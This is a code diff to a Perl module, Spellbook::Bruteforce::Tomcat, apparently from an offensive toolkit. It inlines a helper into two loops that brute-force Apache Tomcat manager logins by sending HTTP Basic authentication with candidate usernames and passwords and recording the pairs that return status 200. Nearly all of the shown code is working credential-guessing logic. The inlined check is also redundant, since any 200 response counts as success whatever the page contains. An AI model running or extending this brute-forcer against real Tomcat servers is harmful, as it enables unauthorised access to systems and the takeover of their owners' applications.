@@ -98,7 +98,27 @@ package Spellbook::Bruteforce::Tomcat {
                 my $credentials = $username . ':' . $candidate_password;
                 my $encoded_credentials = encode_base64($credentials, '');
                 my $response = $userAgent -> request(GET $manager_url, Authorization => "Basic $encoded_credentials");
-                my $is_success = is_successful_response($response);
+                my $is_success = 0;
+                my $status_code = $response -> code;
+                my $is_status_success = 0;
+
+                if ($status_code == 200) {
+                    $is_status_success = 1;
+                }
+
+                if ($is_status_success) {
+                    $is_success = 1;
+                }
+
+                if ($is_status_success) {
+                    my $content = $response -> decoded_content;
+
+                    if ($content) {
+                        if ($content =~ /Tomcat|Web Application Manager|Manager App/i) {
+                            $is_success = 1;
+                        }
+                    }
+                }
 
                 if ($is_success) {
                     push @result, $username . ':' . $candidate_password;
@@ -124,7 +144,27 @@ package Spellbook::Bruteforce::Tomcat {
                 my $credentials = $candidate_username . ':' . $password;
                 my $encoded_credentials = encode_base64($credentials, '');
                 my $response = $userAgent -> request(GET $manager_url, Authorization => "Basic $encoded_credentials");
-                my $is_success = is_successful_response($response);
+                my $is_success = 0;
+                my $status_code = $response -> code;
+                my $is_status_success = 0;
+
+                if ($status_code == 200) {
+                    $is_status_success = 1;
+                }
+
+                if ($is_status_success) {
+                    $is_success = 1;
+                }
+
+                if ($is_status_success) {
+                    my $content = $response -> decoded_content;
+
+                    if ($content) {
+                        if ($content =~ /Tomcat|Web Application Manager|Manager App/i) {
+                            $is_success = 1;
+                        }
+                    }
+                }
 
                 if ($is_success) {
                     push @result, $candidate_username . ':' . $password;
@@ -136,32 +176,6 @@ package Spellbook::Bruteforce::Tomcat {
         return @result;
     }
 
-    sub is_successful_response {
-        my ($response) = @_;
-        my $is_success = 0;
-        my $status_code = $response -> code;
-        my $is_status_success = 0;
-
-        if ($status_code == 200) {
-            $is_status_success = 1;
-        }
-
-        if ($is_status_success) {
-            $is_success = 1;
-        }
-
-        if ($is_status_success) {
-            my $content = $response -> decoded_content;
-
-            if ($content) {
-                if ($content =~ /Tomcat|Web Application Manager|Manager App/i) {
-                    $is_success = 1;
-                }
-            }
-        }
-
-        return $is_success;
-    }
 }
 
 1;
